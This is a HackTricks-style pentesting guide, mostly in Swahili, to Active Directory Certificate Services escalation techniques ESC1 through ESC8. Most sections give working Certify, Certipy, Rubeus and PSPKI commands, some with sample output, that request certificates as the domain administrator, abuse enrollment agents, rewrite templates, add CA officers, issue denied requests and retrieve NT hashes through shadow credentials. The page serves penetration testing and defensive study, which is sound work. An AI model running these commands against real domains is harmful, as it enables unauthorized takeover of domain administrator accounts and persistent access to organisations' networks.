# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Huu ni muhtasari wa sehemu za mbinu za escalation kutoka kwenye machapisho:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Maelezo

### Misconfigured Certificate Templates - ESC1 Imeelezwa

- **Haki za enrolment zinatolewa kwa users wenye privileges ndogo na Enterprise CA.**
- **Idhini ya manager haihitajiki.**
- **Hakuna signatures kutoka kwa personnel walioidhinishwa zinazohitajika.**
- **Security descriptors kwenye certificate templates zina ruhusa nyingi kupita kiasi, hivyo kuwawezesha users wenye privileges ndogo kupata haki za enrolment.**
- **Certificate templates zimesanidiwa kufafanua EKUs zinazowezesha authentication:**
- Vitambulishi vya Extended Key Usage (EKU), kama vile Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), au kutokuwepo kwa EKU (SubCA), vinajumuishwa.
- **Uwezo wa requesters kujumuisha subjectAltName katika Certificate Signing Request (CSR) unaruhusiwa na template:**
- Active Directory (AD) huipa subjectAltName (SAN) katika certificate kipaumbele kwa ajili ya identity verification ikiwa ipo. Hii inamaanisha kuwa kwa kubainisha SAN katika CSR, certificate inaweza kuombwa ili ku-impersonate user yeyote (kwa mfano, domain administrator). Ikiwa SAN inaweza kubainishwa na requester, hilo huonyeshwa katika AD object ya certificate template kupitia property ya `mspki-certificate-name-flag`. Property hii ni bitmask, na kuwepo kwa flag ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` huruhusu requester kubainisha SAN.

> [!CAUTION]
> Configuration iliyoelezwa inawaruhusu users wenye privileges ndogo kuomba certificates zenye SAN yoyote wanayochagua, na hivyo kuwezesha authentication kama domain principal yeyote kupitia Kerberos au SChannel.

Feature hii wakati mwingine huwezeshwa ili kusaidia generation ya HTTPS au host certificates kwa wakati huo huo na products au deployment services, au kutokana na ukosefu wa uelewa.

Imebainika kuwa kuunda certificate yenye option hii husababisha warning, jambo ambalo halitokei wakati certificate template iliyopo (kama template ya `WebServer`, ambayo imewezeshwa `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) inaduplicatiwa na kisha kurekebishwa ili kujumuisha authentication OID.<sup>[[6]](#references)</sup>

### Abuse

Ili **kupata certificate templates zilizo vulnerable**, unaweza kuendesha:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Ili **kutumia vibaya udhaifu huu kuiga utambulisho wa administrator**, mtu anaweza kuendesha:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Kisha unaweza kubadilisha **certificate kuwa katika format ya `.pfx`** na kuitumia **ku-authenticate kwa kutumia Rubeus au certipy** tena:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Binaries za Windows "Certreq.exe" na "Certutil.exe" zinaweza kutumika kutengeneza PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Uorodheshaji wa certificate templates ndani ya configuration schema ya AD Forest, hasa zile zisizohitaji approval au signatures, zikiwa na EKU ya Client Authentication au Smart Card Logon, na zikiwa na flag ya `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` iliyowezeshwa, unaweza kufanywa kwa kuendesha LDAP query ifuatayo:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Certificate Templates Zisizosanidiwa Vizuri - ESC2

### Maelezo

Hali ya pili ya abuse ni tofauti ya ya kwanza:

1. Haki za enrollment zimepewa watumiaji wenye privileges ndogo na Enterprise CA.
2. Sharti la idhini ya msimamizi limezimwa.
3. Hitaji la signatures zilizoidhinishwa limeondolewa.
4. Security descriptor yenye ruhusa kupita kiasi kwenye certificate template inawapa watumiaji wenye privileges ndogo haki za certificate enrollment.
5. **Certificate template imefafanuliwa kujumuisha Any Purpose EKU au kutokuwa na EKU.**

**Any Purpose EKU** inaruhusu attacker kupata certificate kwa **purpose yoyote**, ikiwemo client authentication, server authentication, code signing, n.k. **Technique iliyotumika kwa ESC3** inaweza kutumiwa kutumia vibaya hali hii.

Certificates zisizo na **EKUs**, ambazo hufanya kazi kama subordinate CA certificates, zinaweza kutumiwa vibaya kwa **purpose yoyote** na **pia kutumika kusaini certificates mpya**. Kwa hivyo, attacker anaweza kubainisha EKUs au fields zozote kwenye certificates mpya kwa kutumia subordinate CA certificate.

Hata hivyo, certificates mpya zilizoundwa kwa ajili ya **domain authentication** hazitafanya kazi ikiwa subordinate CA haijaaminiwa na object ya **`NTAuthCertificates`**, ambayo ndiyo setting ya default. Pamoja na hayo, attacker bado anaweza kuunda **certificates mpya zenye EKU yoyote** na certificate values za kiholela. Hizi zinaweza **kutumiwa vibaya** kwa purposes mbalimbali (kwa mfano, code signing, server authentication, n.k.) na zinaweza kuwa na athari kubwa kwa applications nyingine kwenye network kama SAML, AD FS, au IPSec.<sup>[[6]](#references)</sup>

Ili ku-enumerate templates zinazolingana na hali hii ndani ya configuration schema ya AD Forest, LDAP query ifuatayo inaweza kutumiwa:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Violezo vya Enrollment Agent Vilivyosaniwa Vibaya - ESC3

### Maelezo

Hali hii inafanana na ya kwanza na ya pili, lakini **inatumia vibaya** **EKU tofauti** (Certificate Request Agent) na **templates 2 tofauti** (kwa hiyo ina seti 2 za mahitaji),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), inayojulikana kama **Enrollment Agent** katika nyaraka za Microsoft, humruhusu principal **kujiandikisha** kwa **certificate** **kwa niaba ya mtumiaji mwingine**.

**“Enrollment agent”** hujiandikisha katika **template** kama hiyo na kutumia **certificate inayotokana na hilo kusaini CSR kwa pamoja kwa niaba ya mtumiaji mwingine**. Kisha **hutuma** **CSR iliyosainiwa kwa pamoja** kwa CA, akijiandikisha katika **template** inayoruhusu **“enroll on behalf of”**, na CA hujibu kwa **certificate inayomilikiwa na mtumiaji “mwingine”**.<sup>[[6]](#references)</sup>

**Mahitaji 1:**

- Haki za kujiandikisha zinatolewa kwa watumiaji wenye privileges ndogo na Enterprise CA.
- Sharti la idhini ya msimamizi limeachwa.
- Hakuna sharti la signatures zilizoidhinishwa.
- Security descriptor ya certificate template inaruhusu sana kupita kiasi, ikiwapa watumiaji wenye privileges ndogo haki za kujiandikisha.
- Certificate template inajumuisha Certificate Request Agent EKU, hivyo kuwezesha kuomba certificate templates nyingine kwa niaba ya principals wengine.

**Mahitaji 2:**

- Enterprise CA inawapa watumiaji wenye privileges ndogo haki za kujiandikisha.
- Idhini ya msimamizi ime-bypass.
- Toleo la schema la template ni 1 au ni zaidi ya 2, na linabainisha Application Policy Issuance Requirement inayohitaji Certificate Request Agent EKU.
- EKU iliyobainishwa katika certificate template inaruhusu uthibitishaji wa domain.
- Vizuizi vya enrollment agents havijatumiki kwenye CA.

### Abuse

Unaweza kutumia [**Certify**](https://github.com/GhostPack/Certify) au [**Certipy**](https://github.com/ly4k/Certipy) ku-abuse hali hii:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **users** wanaoruhusiwa **kupata** **enrollment agent certificate**, templates ambazo **agents** wanaruhusiwa kutumia kwa ajili ya enrollment, na **accounts** ambazo enrollment agent anaweza kuwakilisha, zinaweza kuzuiwa na enterprise CAs. Hili hufanywa kwa kufungua `certsrc.msc` **snap-in**, **kubofya kulia CA**, **kubofya Properties**, kisha **kwenda** kwenye kichupo cha “Enrollment Agents”.

Hata hivyo, inabainishwa kuwa mpangilio wa **default** wa CAs ni “**Do not restrict enrollment agents**.” Wasimamizi wanapowasha kizuizi kwa enrollment agents kwa kuchagua “Restrict enrollment agents,” usanidi wa default bado una ruhusa nyingi kupita kiasi. Unaruhusu **Everyone** kufanya enrollment katika templates zote kwa niaba ya mtu yeyote.

## Vulnerable Certificate Template Access Control - ESC4

### **Maelezo**

**Security descriptor** kwenye **certificate templates** hufafanua **permissions** ambazo **AD principals** mahususi wanazo kuhusu template hiyo.

Iwapo **attacker** ana **permissions** zinazohitajika za **kubadilisha** **template** na **kuanzisha** **misconfigurations zinazoweza kutumiwa vibaya** zilizoelezwa katika **sehemu zilizotangulia**, privilege escalation inaweza kuwezekana.

Permissions muhimu zinazotumika kwenye certificate templates ni pamoja na:<sup>[[6]](#references)</sup>

- **Owner:** Hutoa udhibiti wa moja kwa moja juu ya object, na kuruhusu kubadilisha attributes yoyote.
- **FullControl:** Hutoa mamlaka kamili juu ya object, ikiwemo uwezo wa kubadilisha attributes yoyote.
- **WriteOwner:** Huruhusu kubadilisha owner wa object kuwa principal aliye chini ya udhibiti wa attacker.
- **WriteDacl:** Huruhusu kurekebisha access controls, jambo linaloweza kumpa attacker FullControl.
- **WriteProperty:** Hutoa ruhusa ya kuhariri properties zozote za object.

### Matumizi Mabaya

Ili kubaini principals walio na haki za kuhariri templates na PKI objects nyingine, fanya enumeration kwa Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Mfano wa privesc kama ule uliotangulia:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ni wakati mtumiaji ana write privileges kwenye certificate template. Hili linaweza, kwa mfano, kutumiwa vibaya kuandika upya configuration ya certificate template ili kufanya template iwe vulnerable kwa ESC1.

Kama tunavyoona kwenye path hapo juu, ni `JOHNPC` pekee aliye na privileges hizi, lakini user wetu `JOHN` ana edge mpya ya `AddKeyCredentialLink` kuelekea `JOHNPC`. Kwa kuwa technique hii inahusiana na certificates, nimeimplement pia attack hii, inayojulikana kama [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Hapa kuna sneak peek ndogo ya command ya Certipy ya `shadow auto` ya kuretrieve NT hash ya victim.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** inaweza kubadilisha usanidi wa certificate template kwa command moja. Kwa **default**, Certipy **itaandika upya** usanidi ili kuifanya iwe **vulnerable to ESC1**. Tunaweza pia kubainisha **`-save-old parameter ili kuhifadhi usanidi wa zamani**, ambao utakuwa muhimu kwa **kurejesha** usanidi baada ya attack yetu.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Udhibiti wa Ufikiaji wa PKI Object Ulio Hatarini - ESC5

### Maelezo

Mtandao mpana wa mahusiano yaliyounganishwa yanayotegemea ACL, unaojumuisha objects kadhaa zaidi ya certificate templates na certificate authority, unaweza kuathiri usalama wa mfumo mzima wa AD CS. Objects hizi, ambazo zinaweza kuathiri kwa kiasi kikubwa usalama, zinajumuisha:

- AD computer object ya CA server, ambayo inaweza kuathiriwa kupitia mbinu kama S4U2Self au S4U2Proxy.
- RPC/DCOM server ya CA server.
- AD object au container yoyote iliyo descendant ndani ya njia maalum ya container `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Njia hii inajumuisha, lakini haiishii kwenye, containers na objects kama Certificate Templates container, Certification Authorities container, NTAuthCertificates object, na Enrollment Services Container.

Usalama wa mfumo wa PKI unaweza kuathiriwa ikiwa attacker mwenye privileges ndogo ataweza kupata udhibiti wa mojawapo ya vipengele hivi muhimu.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Maelezo

Mada iliyojadiliwa katika [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) pia inagusia athari za flag ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kama zilivyoelezwa na Microsoft. Configuration hii, inapowashwa kwenye Certification Authority (CA), inaruhusu kuingizwa kwa **values zinazofafanuliwa na user** kwenye **subject alternative name** kwa **request yoyote**, ikiwemo zile zinazoundwa kutoka Active Directory®. Kwa hiyo, kipengele hiki kinamruhusu **intruder** ku-enroll kupitia **template yoyote** iliyosanidiwa kwa **authentication** ya domain—hasa templates zilizo wazi kwa enrollment ya user **asiye na privileges**, kama User template ya kawaida. Kwa sababu hiyo, certificate inaweza kupatikana, na kumwezesha intruder ku-authenticate kama domain administrator au **entity nyingine yoyote inayotumika** ndani ya domain.<sup>[[9]](#references)</sup>

**Kumbuka**: Mbinu ya kuongeza **alternative names** kwenye Certificate Signing Request (CSR), kupitia argument ya `-attrib "SAN:"` katika `certreq.exe` (inayorejelewa kama “Name Value Pairs”), ni tofauti na exploitation strategy ya SANs katika ESC1. Tofauti iko katika **jinsi taarifa za account zinavyowekwa**—ndani ya certificate attribute badala ya extension.

### Abuse

Ili kuthibitisha ikiwa setting imewashwa, mashirika yanaweza kutumia command ifuatayo pamoja na `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Operesheni hii kimsingi hutumia **remote registry access**, hivyo, mbinu mbadala inaweza kuwa:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Zana kama [**Certify**](https://github.com/GhostPack/Certify) na [**Certipy**](https://github.com/ly4k/Certipy) zina uwezo wa kugundua usanidi huu usio sahihi na kuutumia:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Ili kubadilisha mipangilio hii, kwa kudhani kuwa una haki za **domain administrative** au zinazolingana, amri ifuatayo inaweza kutekelezwa kutoka kwenye workstation yoyote:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Ili kuzima configuration hii katika mazingira yako, flag inaweza kuondolewa kwa:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Baada ya security updates za Mei 2022, **certificates** mpya zitakazotolewa zitakuwa na **security extension** inayojumuisha **property ya `objectSid` ya requester**. Kwa ESC1, SID hii hutokana na SAN iliyobainishwa. Hata hivyo, kwa **ESC6**, SID huakisi **`objectSid` ya requester**, si SAN.\
> Ili kutumia ESC6, ni muhimu mfumo uwe susceptible kwa ESC10 (Weak Certificate Mappings), ambayo hutanguliza **SAN kuliko security extension mpya**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Maelezo

Access control ya certificate authority hudumishwa kupitia seti ya permissions zinazosimamia vitendo vya CA. Permissions hizi zinaweza kuonekana kwa kufungua `certsrv.msc`, kubofya CA kwa right-click, kuchagua properties, kisha kwenda kwenye Security tab. Pia, permissions zinaweza ku-enumerate kwa kutumia module ya PSPKI pamoja na commands kama:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Hii inatoa maarifa kuhusu rights kuu, ambazo ni **`ManageCA`** na **`ManageCertificates`**, zinazohusiana na roles za “CA administrator” na “Certificate Manager” mtawalia.<sup>[[6]](#references)</sup>

#### Matumizi mabaya

Kuwa na rights za **`ManageCA`** kwenye certificate authority humwezesha principal kurekebisha mipangilio kwa mbali kwa kutumia PSPKI. Hii inajumuisha kuwasha flag ya **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ili kuruhusu kubainishwa kwa SAN katika template yoyote, jambo muhimu katika domain escalation.

Mchakato huu unaweza kurahisishwa kwa kutumia cmdlet ya PSPKI **Enable-PolicyModuleFlag**, inayoruhusu marekebisho bila kuingiliana moja kwa moja na GUI.

Kuwa na rights za **`ManageCertificates`** huwezesha kuidhinisha requests zinazosubiri, hivyo kukwepa ulinzi wa "CA certificate manager approval".

Mchanganyiko wa modules za **Certify** na **PSPKI** unaweza kutumiwa kuomba, kuidhinisha na kupakua certificate:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Shambulizi la 2

#### Maelezo

> [!WARNING]
> Katika **shambulizi la awali**, ruhusa za **`Manage CA`** zilitumika **kuwezesha** flag ya **EDITF_ATTRIBUTESUBJECTALTNAME2** ili kutekeleza **shambulizi la ESC6**, lakini hii haitakuwa na athari hadi huduma ya CA (`CertSvc`) ianzishwe upya. Mtumiaji anapokuwa na haki ya ufikiaji ya **`Manage CA`**, pia anaruhusiwa **kuanzisha upya huduma**. Hata hivyo, hii **haimaanishi kuwa mtumiaji anaweza kuanzisha upya huduma kwa mbali**. Zaidi ya hayo, **ESC6 huenda isifanye kazi moja kwa moja** katika mazingira mengi yaliyofanyiwa patch kutokana na masasisho ya usalama ya Mei 2022.

Kwa hiyo, shambulizi lingine linaonyeshwa hapa.

Masharti ya awali:

- Ruhusa ya **`ManageCA`** pekee
- Ruhusa ya **`Manage Certificates`** (inaweza kutolewa kupitia **`ManageCA`**)
- Template ya certificate ya **`SubCA`** lazima **iwe enabled** (inaweza kuwezeshwa kupitia **`ManageCA`**)

Technique hii inategemea ukweli kwamba watumiaji walio na haki za ufikiaji za `Manage CA` _na_ `Manage Certificates` wanaweza **kuwasilisha maombi ya certificate yaliyoshindikana**. Template ya certificate ya **`SubCA`** iko **vulnerable kwa ESC1**, lakini **wasimamizi pekee** ndio wanaoweza kujiandikisha kwenye template hiyo. Hivyo, **mtumiaji** anaweza **kuomba** kujiandikisha katika **`SubCA`** - ombi hilo **litakataliwa** - lakini **baadaye litatolewa na msimamizi**.<sup>[[6]](#references)</sup>

#### Matumizi mabaya

Unaweza **kujipa mwenyewe** haki ya ufikiaji ya **`Manage Certificates`** kwa kumuongeza mtumiaji wako kama afisa mpya.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Template ya **`SubCA`** inaweza **kuwezeshwa kwenye CA** kwa parameter ya `-enable-template`. Kwa chaguo-msingi, template ya `SubCA` imewezeshwa.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ikiwa tumetimiza masharti ya awali ya shambulio hili, tunaweza kuanza kwa **kuomba certificate kulingana na template ya `SubCA`**.

**Ombi hili litakataliwa**, lakini tutahifadhi private key na kuandika request ID.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Kwa kutumia **`Manage CA` na `Manage Certificates`**, tunaweza kisha **kutoa ombi la cheti lililoshindikana** kwa amri ya `ca` na kigezo cha `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Na hatimaye, tunaweza **kupata cheti kilichotolewa** kwa kutumia command ya `req` na parameter ya `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Abuse ya Manage Certificates Extension (SetExtension)

#### Maelezo

Mbali na matumizi mabaya ya kawaida ya ESC7 (kuwezesha attributes za EDITF au kuidhinisha requests zinazosubiri), **Certify 2.0** ilifichua primitive mpya kabisa inayohitaji tu role ya *Manage Certificates* (pia huitwa **Certificate Manager / Officer**) kwenye Enterprise CA.<sup>[[3]](#references)</sup>

Njia ya RPC `ICertAdmin::SetExtension` inaweza kutekelezwa na principal yeyote aliye na *Manage Certificates*. Ingawa njia hii ilitumika kijadi na CAs halali kusasisha extensions kwenye requests **zinazosubiri**, attacker anaweza kuitumia vibaya **kuongeza *non-default* certificate extension** (kwa mfano OID maalum ya *Certificate Issuance Policy* kama `1.1.1.1`) kwenye request inayosubiri kuidhinishwa.

Kwa sababu template inayolengwa **haifafanui thamani ya default ya extension hiyo**, CA HAIITAFUTA wala kuibadilisha value inayodhibitiwa na attacker request itakapotolewa baadaye. Kwa hiyo, certificate inayozalishwa huwa na extension iliyochaguliwa na attacker, ambayo inaweza:

* Kutimiza mahitaji ya Application / Issuance Policy ya templates nyingine zilizo vulnerable (na kusababisha privilege escalation).
* Kuingiza EKUs au policies za ziada zinazopa certificate trust isiyotarajiwa kwenye third-party systems.

Kwa ufupi, *Manage Certificates* – ambayo hapo awali ilichukuliwa kuwa sehemu “isiyo na nguvu zaidi” ya ESC7 – sasa inaweza kutumiwa vibaya kwa privilege escalation kamili au persistence ya muda mrefu, bila kugusa CA configuration wala kuhitaji right yenye vizuizi zaidi ya *Manage CA*.

#### Kutumia primitive vibaya kwa Certify 2.0

1. **Tuma certificate request itakayobaki *pending*.** Hili linaweza kulazimishwa kwa kutumia template inayohitaji manager approval:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Ongeza custom extension kwenye request inayosubiri** kwa kutumia command mpya ya `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Ikiwa template haifafanui tayari extension ya *Certificate Issuance Policies*, value iliyo hapo juu itahifadhiwa baada ya issuance.*

3. **Toa request** (ikiwa role yako pia ina rights za approval za *Manage Certificates*) au subiri operator aiidhinishe. Ikishatolewa, download certificate:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Certificate inayotokana sasa ina malicious issuance-policy OID na inaweza kutumika katika attacks zinazofuata (kwa mfano ESC13, domain escalation, n.k.).

> NOTE:  Attack hiyo hiyo inaweza kutekelezwa kwa Certipy ≥ 4.7 kupitia command ya `ca` na parameter ya `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Maelezo

> [!TIP]
> Katika environments ambako **AD CS imewekwa**, ikiwa kuna **web enrollment endpoint vulnerable** na angalau **certificate template moja imechapishwa** inayoruhusu **domain computer enrollment na client authentication** (kama template ya default **`Machine`**), basi inawezekana kwa **computer yoyote iliyo na spooler service active kucompromise na attacker**!

AD CS inasaidia **mbinu kadhaa za enrollment zinazotumia HTTP**, zinazopatikana kupitia server roles za ziada ambazo administrators wanaweza kusakinisha. Interfaces hizi za HTTP-based certificate enrollment zinaathiriwa na **NTLM relay attacks**. Attacker, kutoka kwenye **machine iliyo compromised, anaweza ku-impersonate AD account yoyote inayofanya authentication kupitia inbound NTLM**. Anapom-impersonate victim account, interfaces hizi za web zinaweza kufikiwa na attacker ili **kuomba client authentication certificate kwa kutumia `User` au `Machine` certificate templates**.

- **Web enrollment interface** (ASP application ya zamani inayopatikana kwenye `http://<caserver>/certsrv/`), kwa default hutumia HTTP pekee, ambayo haitoi ulinzi dhidi ya NTLM relay attacks. Zaidi ya hayo, inaruhusu waziwazi NTLM authentication pekee kupitia Authorization HTTP header yake, hivyo authentication methods salama zaidi kama Kerberos haziwezi kutumika.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, na **Network Device Enrollment Service** (NDES) kwa default zinaunga mkono negotiate authentication kupitia Authorization HTTP header yao. Negotiate authentication **inaunga mkono Kerberos na NTLM**, hivyo kumruhusu attacker **kushusha authentication hadi NTLM** wakati wa relay attacks. Ingawa web services hizi zinawezesha HTTPS kwa default, HTTPS pekee **hailindi dhidi ya NTLM relay attacks**. Ulinzi dhidi ya NTLM relay attacks kwa HTTPS services unawezekana tu HTTPS inapounganishwa na channel binding. Kwa bahati mbaya, AD CS haiwezeshi Extended Protection for Authentication kwenye IIS, ambayo inahitajika kwa channel binding.<sup>[[6]](#references)</sup>

**Tatizo** la kawaida la NTLM relay attacks ni **muda mfupi wa NTLM sessions** na kutoweza kwa attacker ku-interact na services zinazohitaji **NTLM signing**.

Hata hivyo, kizuizi hiki kinaondolewa kwa kutumia NTLM relay attack kupata certificate ya user, kwa kuwa validity period ya certificate huamua muda wa session, na certificate inaweza kutumiwa na services ambazo **zinalazimisha NTLM signing**. Kwa maelekezo ya kutumia stolen certificate, rejelea:


{{#ref}}
account-persistence.md
{{#endref}}

Kizuizi kingine cha NTLM relay attacks ni kwamba **machine inayodhibitiwa na attacker lazima i-authenticate-iwe na victim account**. Attacker anaweza kusubiri au kujaribu **kulazimisha** authentication hiyo:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` huorodhesha **enabled HTTP AD CS endpoints**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Sifa ya `msPKI-Enrollment-Servers` hutumiwa na enterprise Certificate Authorities (CAs) kuhifadhi endpoints za Certificate Enrollment Service (CES). Endpoints hizi zinaweza kuchanganuliwa na kuorodheshwa kwa kutumia zana ya **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

